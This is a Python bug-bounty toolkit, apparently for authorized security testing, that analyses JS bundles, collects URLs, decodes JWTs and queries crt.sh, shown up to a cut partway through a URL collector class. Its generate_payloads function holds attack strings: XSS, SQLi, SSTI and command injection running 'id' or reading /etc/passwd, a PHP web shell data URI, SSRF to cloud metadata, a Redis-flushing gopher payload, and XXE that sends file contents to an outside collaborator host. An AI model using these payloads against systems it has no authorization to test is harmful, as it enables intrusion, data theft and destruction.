#!/usr/bin/env python3
"""
python-hunter.py — Bug Bounty Python Toolkit

A comprehensive Python toolkit for bug bounty hunting and security testing.
Provides reusable classes and functions for JS analysis, URL collection,
secret scanning, endpoint fuzzing, encoding/decoding, batch processing,
report generation, and common offensive-security utilities.

Requirements:
    pip install requests

Built-in modules: re, json, base64, sys, os, hashlib, urllib, concurrent.futures,
                  dataclasses, typing, csv, html, textwrap, time, ssl, math

Author: python-hunter
License: MIT (internal tooling)
Version: 1.0.0

Example usage:
    python python-hunter.py --analyze-js https://target.com/app.bundle.js
    python python-hunter.py --scan-secrets /path/to/source/code
    python python-hunter.py --collect-urls https://target.com --scope "*.target.com"
    python python-hunter.py --decode-jwt eyJhbGciOiJIUzI1NiJ9...
    python python-hunter.py --payloads xss
    python python-hunter.py --crt target.com
    python python-hunter.py --hash /path/to/file
"""

import base64
import concurrent.futures
import csv
import hashlib
import html
import json
import math
import os
import re
import ssl
import sys
import textwrap
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass, field, asdict
from datetime import datetime
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union
from urllib.parse import urljoin, urlparse, parse_qs

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


# ═══════════════════════════════════════════════════════════════════════════════
# SCRIPT METADATA
# ═══════════════════════════════════════════════════════════════════════════════

__version__ = "1.0.0"
__author__ = "python-hunter"
__description__ = "Bug Bounty Python Toolkit — JS analysis, secret scanning, URL collection, fuzzing, reporting"

HEADER_BANNER = r"""
  ___       _   _  __
 | _ \_  _ | | | |/ /___ _ _ _  _   _
 |  _/ || | |_| | ' </ -_) '_| || | |_|
 |_|  \_, |\___/|_|\_\___|_|  \_, | (_)
      |__/                   |__/
  Python Bug Bounty Toolkit v{version}
  {description}
""".format(version=__version__, description=__description__)

REQUIRED_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
}

CONFIG = {
    "timeout": 30,
    "max_redirects": 5,
    "rate_limit": 0.1,
    "max_workers": 10,
    "verify_ssl": True,
    "output_dir": os.path.join(os.getcwd(), "hunter_output"),
}


# ═══════════════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

def decode_jwt(token: str) -> Dict[str, Any]:
    """
    Decode a JWT token WITHOUT verification. Returns header and payload as dicts.

    Handles standard base64url encoding and adds padding if needed.

    Args:
        token: The JWT string (header.payload.signature)

    Returns:
        dict with keys 'header' and 'payload', each containing decoded JSON data.
        Returns error dict if decoding fails.

    Example:
        >>> decode_jwt("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dummy")
        {'header': {'alg': 'HS256'}, 'payload': {'sub': '1234567890'}}
    """
    parts = token.split(".")
    if len(parts) != 3:
        if len(parts) == 2:
            return {"error": "Only 2 segments (not a standard JWT)", "segments": parts}
        return {"error": "Unexpected segment count", "count": len(parts)}

    result = {}
    labels = ["header", "payload"]

    for i, label in enumerate(labels):
        try:
            raw = parts[i]
            padding = 4 - len(raw) % 4
            if padding != 4:
                raw += "=" * padding
            decoded = base64.urlsafe_b64decode(raw)
            result[label] = json.loads(decoded)
        except Exception as e:
            result[label] = {"error": f"Failed to decode {label}: {str(e)}"}

    return result


def find_urls_in_text(text: str) -> List[str]:
    """
    Extract all URLs from any text using regex.

    Matches http/https/ftp URLs with comprehensive pattern coverage,
    including URLs in quotes, parentheses, brackets, and plain text.

    Args:
        text: The input text to scan.

    Returns:
        Deduplicated list of URLs found in the text.

    Example:
        >>> find_urls_in_text("Visit https://example.com/path?q=1 and http://test.com")
        ['https://example.com/path?q=1', 'http://test.com']
    """
    # Pattern matches standard URLs, handles various surrounding characters
    url_pattern = re.compile(
        r'(?:https?|ftp)://'
        r'(?:[^\s<>"\'{}|\\^`\[\]]+)'
        r'(?::\d+)?'
        r'(?:/[^\s<>"\'{}|\\^`\[\]]*)?'
        r'(?:\?[^\s<>"\'{}|\\^`\[\]]*)?'
        r'(?:#[^\s<>"\'{}|\\^`\[\]]*)?',
        re.IGNORECASE
    )

    found = url_pattern.findall(text)
    seen: Set[str] = set()
    result = []
    for url in found:
        url = url.rstrip(".,;:!?)]}>")
        if url not in seen:
            seen.add(url)
            result.append(url)
    return result


def calculate_hash(filepath: str, algorithm: str = "sha256") -> str:
    """
    Calculate the hash of a file using the specified algorithm.

    Reads file in chunks for memory efficiency with large files.

    Args:
        filepath: Path to the file.
        algorithm: Hash algorithm — 'sha256' or 'md5'.

    Returns:
        Hex digest string of the file hash.

    Raises:
        FileNotFoundError: If the file does not exist.
        ValueError: If an unsupported algorithm is specified.

    Example:
        >>> calculate_hash("/etc/passwd", "md5")
        'd41d8cd98f00b204e9800998ecf8427e'
    """
    algorithm = algorithm.lower().replace("-", "").replace("_", "")
    hash_map = {
        "sha256": hashlib.sha256,
        "md5": hashlib.md5,
    }

    if algorithm not in hash_map:
        raise ValueError(f"Unsupported hash algorithm: {algorithm}. Use sha256 or md5.")

    hasher = hash_map[algorithm]()
    chunk_size = 65536  # 64KB

    with open(filepath, "rb") as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            hasher.update(chunk)

    return hasher.hexdigest()


def generate_payloads(bug_class: str) -> List[str]:
    """
    Generate test payloads for common bug classes.

    Supported classes: xss, ssti, sqli, ssrf, command-injection, lfi,
                       open-redirect, nosqli, idor, xxe

    Args:
        bug_class: Lowercase string identifying the bug type.

    Returns:
        List of payload strings appropriate for the bug class.

    Example:
        >>> generate_payloads("xss")[:2]
        ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>']
    """
    bug_class = bug_class.lower().strip().replace(" ", "-").replace("_", "-")

    PAYLOAD_LIBRARY: Dict[str, List[str]] = {
        "xss": [
            # Basic script injection
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "';alert(1);//",
            '<scr<script>ipt>alert(1)</scr<script>ipt>',
            '<a href="javascript:alert(1)">click</a>',
            '<details/open/ontoggle=alert(1)>',
            '<body/onload=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<keygen autofocus onfocus=alert(1)>',
            '"><svg/onload=confirm(1)>',
            "'-alert(1)-'",
            "`-alert(1)-`",
            '{{constructor.constructor("alert(1)")()}}',
            '<%2Fscript><script>alert(1)</script>',
            '<IMG SRC="jav&#x09;ascript:alert(1)">',
            '<IMG SRC="jav&#x0A;ascript:alert(1)">',
            '<IMG SRC="jav&#x0D;ascript:alert(1)">',
            # Polyglot
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
            # DOM-based
            '#<img/src=x/onerror=alert(1)>',
            'javascript:alert(1)',
        ],
        "ssti": [
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '*{7*7}',
            '{7*7}',
            '{{7*\'7\'}}',
            '<%= 7*7 %>',
            '{{config}}',
            '{{self}}',
            '{{"".__class__.__mro__[2].__subclasses__()}}',
            '{{ cycler.__init__.__globals__.os.popen("id").read() }}',
            '{{lipsum.__globals__["os"].popen("id").read()}}',
            '{{joiner.__init__.__globals__.os.popen("id").read()}}',
            '${7*7}',
            '#set($x=7*7)$x',
            '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}} {{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
            '*{7*7}',
            '{{dump}}',
            '{{app.request.server.all|join(",")}}',
        ],
        "sqli": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1 --",
            '" OR 1=1 --',
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT @@version--",
            "' UNION SELECT database()--",
            "' AND SLEEP(5)--",
            "' AND 1=1--",
            "' AND 1=2--",
            "'; WAITFOR DELAY '0:0:5'--",
            "') WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
            "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a) AND '1'='1",
            "1/**/AND/**/SLEEP(5)",
            "' OR '1'='1' /*",
            "1' AND 1=1 UNION SELECT 1,2,3,table_name FROM information_schema.tables--",
            "'/**/OR/**/'1'/'1",
            "'/*!OR*/'1'='1",
        ],
        "ssrf": [
            "http://localhost",
            "http://localhost:80",
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://[::1]",
            "http://[::1]:80",
            "http://0.0.0.0",
            "http://0",
            "http://0.0.0.0:80",
            "http://2130706433",
            "http://0x7f000001",
            "http://0177.0.0.1",
            "http://127.1",
            "http://127.0.1",
            "http://localhost.+",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:27017",
            "http://metadata.google.internal",
            "http://169.254.169.254",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$4%0d%0adoge%0d%0a*1%0d%0a$4%0d%0asave%0d%0a",
        ],
        "command-injection": [
            "; whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "& whoami &",
            "|| whoami",
            "&& whoami",
            '"; whoami"',
            "' || whoami ||'",
            "| ping -n 5 127.0.0.1",
            "& ping -n 5 127.0.0.1 &",
            "| echo $(whoami)",
            "$(ping -c 5 127.0.0.1)",
            "`ping -c 5 127.0.0.1`",
            "| cat /etc/passwd",
            "; cat /etc/passwd",
            "| type C:\\Windows\\win.ini",
            "; type C:\\Windows\\win.ini",
        ],
        "lfi": [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "../../../../windows/win.ini",
            "/etc/passwd",
            "/etc/passwd%00",
            "../../../etc/passwd%00",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=config.php",
            "file:///etc/passwd",
            "expect://id",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        ],
        "open-redirect": [
            "//evil.com",
            "//evil.com/",
            "https://evil.com",
            "http://evil.com",
            "///evil.com",
            "https:/evil.com",
            "http:/evil.com",
            "/\\evil.com",
            "//evil.com@good.com",
            "https://evil.com@good.com",
            "https://evil.com%2fgood.com",
            "https://evil.com%2Fgood.com",
            "//evil.com%2fgood.com",
            "https://evil.com\\@good.com",
            "/url?=//evil.com",
            "/url?=https://evil.com",
            "http://evil.com:80%00@good.com",
            "javascript:alert(1)//",
        ],
        "nosqli": [
            '{"$gt": ""}',
            '{"$ne": ""}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{"$exists": true}',
            'username[$ne]=nonexistent&password[$ne]=nonexistent',
            'username[$gt]=&password[$gt]=',
            'username[$regex]=.*&password[$regex]=.*',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '{"$or": [{"username": "admin"}, {"privilege": {"$gt": ""}}]}',
        ],
        "idor": [
            "1",
            "2",
            "3",
            "100",
            "1000",
            "999999",
            "0",
            "-1",
            "true",
            "false",
            "null",
            '{"id": 1}',
            '{"user_id": 1}',
            '{"account_id": 1}',
            '{"uid": "admin"}',
            "0000000001",
            "admin",
            "../1",
            "0001",
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://COLLABORATOR.dnslog.cn/xxe">%remote;]><root/>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://COLLABORATOR.dnslog.cn/%file;">]>',
        ],
    }

    return PAYLOAD_LIBRARY.get(bug_class, [
        f"No payload library for '{bug_class}'. Supported: {', '.join(PAYLOAD_LIBRARY.keys())}"
    ])


def extract_domains_from_crt(domain: str) -> List[str]:
    """
    Query crt.sh Certificate Transparency log for subdomains of a given domain.

    Uses the crt.sh API (?output=json) to retrieve all certificates issued
    for the domain and extracts subject common names and SAN entries.

    Args:
        domain: The root domain to query (e.g. 'target.com').

    Returns:
        Deduplicated sorted list of subdomains and hostnames found.

    Example:
        >>> domains = extract_domains_from_crt("example.com")
        >>> print(domains[:3])
        ['mail.example.com', 'www.example.com', 'api.example.com']
    """
    import ssl as ssl_module

    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    headers = {"User-Agent": REQUIRED_HEADERS["User-Agent"]}

    subdomains: Set[str] = set()
    try:
        ctx = ssl_module.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl_module.CERT_NONE

        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, context=ctx, timeout=CONFIG["timeout"]) as resp:
            data = json.loads(resp.read().decode("utf-8"))

        for entry in data:
            name_value = entry.get("name_value", "")
            for name in name_value.split("\n"):
                name = name.strip().lower()
                if name and not name.startswith("*"):
                    if domain in name or name.endswith("." + domain):
                        subdomains.add(name)

    except Exception as e:
        print(f"[!] crt.sh query failed for {domain}: {e}", file=sys.stderr)

    return sorted(subdomains)


# ═══════════════════════════════════════════════════════════════════════════════
# CLASS: JSAnalyzer
# ═══════════════════════════════════════════════════════════════════════════════

class JSAnalyzer:
    """
    JavaScript bundle analyzer for bug bounty recon.

    Downloads JS bundles from URLs or reads local files, then extracts:
    - API endpoints and routes
    - Secrets and credentials (via SecretScanner)
    - Feature flags and configuration
    - Source map references and data

    Also supports diffing two versions of the same bundle.

    Attributes:
        content: Raw JS file content as string.
        source_url: Original URL or file path of the analyzed bundle.
        endpoints: Extracted API endpoints.
        results: Complete analysis results dict.
    """

    # Regex patterns for endpoint discovery in JS
    ENDPOINT_PATTERNS = [
        re.compile(r'["\']((?:https?://|/)(?:[a-zA-Z0-9._/-]+(?:/api/|/v[0-9]+/|/rest/|/graphql|/auth/|/oauth/|/saml/|/ws/|/wss/|/socket)[a-zA-Z0-9._?=/&%-]*))["\']'),
        re.compile(r'["\'](/[a-zA-Z0-9_/.-]*(?:api|rest|graphql|auth|oauth|v1|v2|v3)[a-zA-Z0-9_/.-]*)["\']'),
        re.compile(r'["\']((?:https?://)?(?:[\w-]+\.)+[\w-]+(?:/[\w./-]+)*)["\']'),
        re.compile(r'fetch\(["\']([^"\']+)["\']'),
        re.compile(r'axios\.(?:get|post|put|patch|delete)\(["\']([^"\']+)["\']'),
        re.compile(r'\$\.(?:get|post|ajax)\(["\']([^"\']+)["\']'),
        re.compile(r'XMLHttpRequest\.open\(["\'](?:GET|POST|PUT|PATCH|DELETE|OPTIONS)["\'],\s*["\']([^"\']+)["\']'),
        re.compile(r'url:\s*["\']([^"\']+)["\']'),
        re.compile(r'path:\s*["\']([^"\']+)["\']'),
        re.compile(r'route:\s*["\']([^"\']+)["\']'),
        re.compile(r'endpoint:\s*["\']([^"\']+)["\']'),
        re.compile(r'baseURL:\s*["\']([^"\']+)["\']'),
        re.compile(r'baseUrl:\s*["\']([^"\']+)["\']'),
        re.compile(r'base_url:\s*["\']([^"\']+)["\']'),
        re.compile(r'["\'](?:https?://[^/]+)?(/graphql?)["\']'),
        re.compile(r'["\'](?:https?://[^/]+)?(/socket\.io/?)["\']'),
        re.compile(r'(?:login|signin|signup|register|auth|token|refresh|logout|session)[^a-z]', re.IGNORECASE),
    ]

    # Feature flag patterns
    FEATURE_FLAG_PATTERNS = [
        re.compile(r'["\'](FF_[A-Z_0-9]+)["\']'),
        re.compile(r'["\'](feature_[a-zA-Z_0-9]+)["\']'),
        re.compile(r'["\'](flag_[a-zA-Z_0-9]+)["\']'),
        re.compile(r'(isEnabled|isDisabled|isActive|isFeatureActive)\s*[:=]\s*(true|false)'),
        re.compile(r'enable[A-Z]\w+\s*[:=]\s*(true|false)'),
        re.compile(r'disable[A-Z]\w+\s*[:=]\s*(true|false)'),
        re.compile(r'(experiment|experiments?|variant|rollout)\s*[:=]\s*["\']([^"\']+)["\']'),
    ]

    # Source map pattern
    SOURCEMAP_PATTERN = re.compile(
        r'//#\s*sourceMappingURL\s*=\s*(.+\.map)'
    )

    # Internal URL patterns
    INTERNAL_DOMAIN_PATTERNS = [
        re.compile(r'["\'](https?://(?:localhost|127\.0\.0\.1|0\.0\.0\.0|10\.\d+\.\d+\.\d+|172\.1[6-9]\.\d+\.\d+|172\.2[0-9]\.\d+\.\d+|172\.3[0-1]\.\d+\.\d+|192\.168\.\d+\.\d+)[^"\']*)["\']'),
        re.compile(r'["\'](https?://[\w-]+\.internal[^"\']*)["\']'),
        re.compile(r'["\'](https?://[\w-]+\.local[^"\']*)["\']'),
    ]

    def __init__(self, source_url: str = "", content: str = ""):
        """
        Initialize the JSAnalyzer.

        Args:
            source_url: URL or file path to the JS bundle.
            content: Direct JS content string (mutually exclusive with source_url).
        """
        self.source_url = source_url
        self.content = content
        self.endpoints: List[str] = []
        self.secrets: List[Dict[str, Any]] = []
        self.feature_flags: List[Dict[str, str]] = []
        self.source_map_url: Optional[str] = None
        self.internal_endpoints: List[str] = []
        self.results: Dict[str, Any] = {}

    def load(self) -> bool:
        """
        Load content from source_url (HTTP or file) or use existing content.

        Returns:
            True if content was loaded successfully, False otherwise.
        """
        if self.content:
            return True

        if not self.source_url:
            print("[!] JSAnalyzer: No source URL or content provided.", file=sys.stderr)
            return False

        if self.source_url.startswith(("http://", "https://")):
            return self._load_from_url()
        else:
            return self._load_from_file()

    def _load_from_url(self) -> bool:
        """Load JS content from a remote URL."""
        if not REQUESTS_AVAILABLE:
            print("[!] requests library required for URL loading. pip install requests", file=sys.stderr)
            return False
        try:
            resp = requests.get(
                self.source_url,
                headers=REQUIRED_HEADERS,
                timeout=CONFIG["timeout"],
                verify=CONFIG["verify_ssl"],
            )
            resp.raise_for_status()
            self.content = resp.text
            print(f"[+] Loaded JS bundle from {self.source_url} ({len(self.content)} bytes)")
            return True
        except Exception as e:
            print(f"[!] Failed to load {self.source_url}: {e}", file=sys.stderr)
            return False

    def _load_from_file(self) -> bool:
        """Load JS content from a local file."""
        try:
            with open(self.source_url, "r", encoding="utf-8", errors="ignore") as f:
                self.content = f.read()
            print(f"[+] Loaded JS bundle from file {self.source_url} ({len(self.content)} bytes)")
            return True
        except Exception as e:
            print(f"[!] Failed to read file {self.source_url}: {e}", file=sys.stderr)
            return False

    def extract_endpoints(self) -> List[str]:
        """
        Extract API endpoints and URLs from JS content.

        Returns:
            Deduplicated sorted list of discovered endpoints.
        """
        if not self.content:
            print("[!] No content to analyze. Call load() first.", file=sys.stderr)
            return []

        found: Set[str] = set()

        for pattern in self.ENDPOINT_PATTERNS:
            matches = pattern.findall(self.content)
            for m in matches:
                endpoint = m.strip("\"'` ")
                if endpoint and len(endpoint) > 2 and not endpoint.startswith(("./", "../", "data:", "blob:")):
                    found.add(endpoint)

        self.endpoints = sorted(found)
        print(f"[+] Extracted {len(self.endpoints)} endpoints from JS bundle")
        return self.endpoints

    def extract_secrets(self) -> List[Dict[str, Any]]:
        """
        Scan JS content for secrets using SecretScanner.

        Returns:
            List of secret findings with type, value, context, and confidence.
        """
        if not self.content:
            print("[!] No content to scan. Call load() first.", file=sys.stderr)
            return []

        scanner = SecretScanner()
        scanner.context_lines = 1
        findings = scanner.scan_text(self.content, source_label=self.source_url or "js_bundle")
        self.secrets = findings
        print(f"[+] Found {len(self.secrets)} potential secrets in JS bundle")
        return self.secrets

    def extract_feature_flags(self) -> List[Dict[str, str]]:
        """
        Extract feature flags and configuration toggles from JS content.

        Returns:
            List of dicts with 'key', 'value', and context details.
        """
        if not self.content:
            return []

        flags: List[Dict[str, str]] = []

        for pattern in self.FEATURE_FLAG_PATTERNS:
            for match in pattern.finditer(self.content):
                flag_data = {
                    "value": match.group(0),
                    "type": "feature_flag",
                }
                if match.lastindex and match.lastindex >= 1:
                    flag_data["key"] = match.group(1)
                flags.append(flag_data)

        # Deduplicate by value
        seen: Set[str] = set()
        self.feature_flags = []
        for f in flags:
            if f["value"] not in seen:
                seen.add(f["value"])
                self.feature_flags.append(f)

        print(f"[+] Found {len(self.feature_flags)} feature flags/config entries")
        return self.feature_flags

    def extract_source_map(self) -> Optional[str]:
        """
        Find sourceMappingURL reference in JS bundle.

        Returns:
            The source map URL string if found, None otherwise.
        """
        if not self.content:
            return None

        match = self.SOURCEMAP_PATTERN.search(self.content)
        if match:
            self.source_map_url = match.group(1).strip()
            print(f"[+] Found source map reference: {self.source_map_url}")
        return self.source_map_url

    def extract_internal_endpoints(self) -> List[str]:
        """
        Extract internal/host-only endpoints (localhost, private IPs, internal domains).

        Returns:
            List of internal endpoint URLs found in the bundle.
        """
        if not self.content:
            return []

        found: Set[str] = set()
        for pattern in self.INTERNAL_DOMAIN_PATTERNS:
            for match in pattern.finditer(self.content):
                url = match.group(1).strip("\"'")
                if "://" in url:
                    found.add(url)

        self.internal_endpoints = sorted(found)
        if self.internal_endpoints:
            print(f"[!] Found {len(self.internal_endpoints)} internal endpoint(s) in JS bundle!")
            for ep in self.internal_endpoints:
                print(f"    {ep}")
        return self.internal_endpoints

    def diff(self, other_content: str, label_a: str = "version_a", label_b: str = "version_b") -> Dict[str, Any]:
        """
        Diff this bundle's content against another version.

        Compares line-by-line, identifies added/removed lines.

        Args:
            other_content: The other JS bundle content to diff against.
            label_a: Label for the current bundle.
            label_b: Label for the other bundle.

        Returns:
            Dict with 'added' and 'removed' line lists.
        """
        lines_a = self.content.splitlines(keepends=False) if self.content else []
        lines_b = other_content.splitlines(keepends=False) if other_content else []

        set_a = set(lines_a)
        set_b = set(lines_b)

        added = [l for l in lines_b if l not in set_a]
        removed = [l for l in lines_a if l not in set_b]

        result = {
            "label_a": label_a,
            "label_b": label_b,
            "lines_a_total": len(lines_a),
            "lines_b_total": len(lines_b),
            "added": added[:500],  # Limit output
            "added_count": len(added),
            "removed": removed[:500],
            "removed_count": len(removed),
        }

        if added:
            print(f"[+] {len(added)} new lines in {label_b}")
        if removed:
            print(f"[-] {len(removed)} lines removed in {label_b}")

        return result

    def analyze_all(self) -> Dict[str, Any]:
        """
        Run all analysis steps and return consolidated results.

        Returns:
            Dict with all findings: endpoints, secrets, feature_flags,
            source_map, internal_endpoints, metadata.
        """
        if not self.load():
            return {"error": "Failed to load content"}

        self.results = {
            "source": self.source_url,
            "size_bytes": len(self.content),
            "endpoints": self.extract_endpoints(),
            "secrets": self.extract_secrets(),
            "feature_flags": self.extract_feature_flags(),
            "source_map": self.extract_source_map(),
            "internal_endpoints": self.extract_internal_endpoints(),
            "analysis_time": datetime.now().isoformat(),
        }

        return self.results

    def output_json(self, filepath: Optional[str] = None) -> str:
        """
        Output analysis results as formatted JSON.

        Args:
            filepath: Optional path to write JSON file.

        Returns:
            JSON string of results.
        """
        if not self.results:
            self.results = self.analyze_all()

        json_str = json.dumps(self.results, indent=2, default=str)

        if filepath:
            os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(json_str)
            print(f"[+] Results written to {filepath}")

        return json_str


# ═══════════════════════════════════════════════════════════════════════════════
# CLASS: URLCollector
# ═══════════════════════════════════════════════════════════════════════════════

class URLCollector:
    """
    Collect and analyze URLs from HTML content, sitemaps, or text sources.

    Features:
    - Parse HTML and extract URLs from <a>, <link>, <form>, <script>, <img> tags
    - Filter URLs by scope (domain matching)
    - Deduplicate and sort results
    - Resolve relative URLs to absolute
    - Optional: crawl sitemap.xml

    Attributes:
        source_url: The origin URL being collected from.
        base_url: Base URL for resolving relative paths.
        scope_domains: List of allowed domains for scope filtering.
        urls: Set of collected absolute URLs.
    """

    # HTML tag patterns for URL extraction
    TAG_PATTERNS = {
        "a": re.compile(r'<a[^>]+href=["\']([^"\']+)["\']', re.IGNORECASE),
        "link": re.compile(r'<link[^>]+href=["\']([^"\']+)["\']', re.IGNORECASE),
        "script": re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE),
        "img": re.compile(r'<img[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE),
        "form": re.compile(r'<form[^>]+action=["\']([^"\']+)["\']', re.IGNORECASE),
        "iframe": re.compile(r'<iframe[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE),
        "source": re.compile(r'<source[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE),
        "video": re.compile(r'<video[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE),
        "audio": re.compile(r'<audio[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE),
    }

    # Ignore these URL patterns (javascript:, mailto:, tel:, data:, blob:, #)
    IGNORE_PATTERNS = re.compile(
        r'^(javascript|mailto|tel|sms|fax|skype|whatsapp|data|blob|#):',
        re.IGNORECASE
    )

    def __init__(self, source_url: str = ""):
        """
        Initialize the URLCollector.

        Args:
            source_url: The URL being analyzed (used as base for resolution).
        """
        self.source_url = source_url
        self.base_url = source_url
        self.scope_domains: List[str] = []
        self.urls: Set[str] = set()
        self.tag_counts: Dict[str, int] = {}
        self.html_content: str = ""

    def load_html(self, html_content: str) -> None:
        """
        Load HTML content directly.

        Args:
            html_content: Raw HTML string to parse.
        """
        self.html_content = html_content

    def fetch(self, url: Optional[str] = None) -> bool:
        """
        Fetch HTML content from a URL.

        Args:
            url: URL to fetch. Falls back to source_url if not provided.

        Returns:
            True if fetch was successful, False otherwise.
        """
        target = url or self.source_url
        if not target:
            print("[!] No URL provided for fetching.", file=sys.stderr)
            return False

        if not REQUESTS_AVAILABLE:
            print("[!] requests library required for fetching. pip install requests", file=sys.stderr)
            return False

        try:
            resp = requests.get(
                target,
                headers=REQUIRED_HEADERS,
                timeout=CONFIG["timeout"],
                verify=CONFIG["verify_ssl"],
            )
            resp.raise_for_status()
            self.html_content = resp.text
            self.source_url = target
            self.base_url = target
            print(f"[+] Fetched {target} ({len(self.html_content)} bytes)")
            return True
        except Exception as e:
            print(f"[!] Failed to fetch {target}: {e}", file=sys.stderr)
            return False

    def set_scope(self, domains: List[str]) -> None:
        """
        Set scope domains for filtering.

        Args:
            domains: List of domains (e.g. ['target.com', 'api.target.com']).
        """
        self.scope_domains = [d.lower().lstrip("*.") for d in domains]

    def _is_in_scope(self, url: str) -> bool:
        """
        Check if a URL is within scope domains.

        Args:
            url: The absolute URL to check.

        Returns:
            True if the URL matches any scope domain.
        """
        if not self.scope_domains:
            return True
        try:
            parsed = urlparse(url)
            hostname = parsed.hostname or ""
            hostname = hostname.lower()
            return any(domain in hostname or hostname.endswith("." + domain) for domain in self.scope_domains)
        except Exception:
            return False

    def is_valid_url(self, url: str) -> bool:
        """
        Check if a URL string is valid and should be collected.

        Args:
            url: URL string to validate.

        Returns:
            True if the URL looks valid and collectable.
        """
        if not url or len(url) < 3:
            return False
        if self.IGNORE_PATTERNS.match(url):
            return False
        if url.startswith("//"):
            url = "https:" + url
        try:
            parsed = urlparse(url)
            return bool(parsed.netloc) and bool(parsed.scheme)
        except Exception:
            return False

    def resolve_url(self, url: str) -> Optional[str]:
        """
        Resolve a potentially relative URL to absolute.

        Args:
            url: Relative or absolute URL string.

        Returns:
            Absolute URL string, or None if resolution fails.
        """
        url = url.strip()
        if not url or len(url) < 2:
            return None

        # Protocol-relative URL
        if url.startswith("//"):
            return "https:" + url

        # Absolute URL
        if url.startswith(("http://", "https://")):
            return url

        # Relative URL
        try:
            if self.base_url:
                absolute = urljoin(self.base_url, url)
                # Remove fragment
                parsed = urlparse(absolute)
                return f"{parsed.scheme}://{parsed.netloc}{parsed.path}{'?' + parsed.query if parsed.query else ''}"
            return None
        except Exception:
            return None

    def extract_urls_from_html(self) -> List[str]:
        """
        Parse stored HTML content and extract all URLs.

        Returns:
            Sorted list of unique, absolute, valid URLs.
        """
        if not self.html_content:
            print("[!] No HTML content loaded.", file=sys.stderr)
            return []

        self.urls.clear()
        self.tag_counts = {}
